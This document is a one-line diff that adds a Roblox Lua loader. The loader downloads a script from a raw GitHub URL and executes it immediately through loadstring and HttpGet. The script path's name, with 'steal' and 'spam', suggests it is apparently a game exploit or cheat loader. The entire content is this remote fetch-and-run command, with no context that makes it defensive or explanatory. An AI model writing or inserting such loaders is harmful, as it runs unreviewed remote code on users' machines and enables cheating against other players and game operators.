@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/plant-steal-co-op-spam7-g6zc1yf7k55g4u.lua"))()
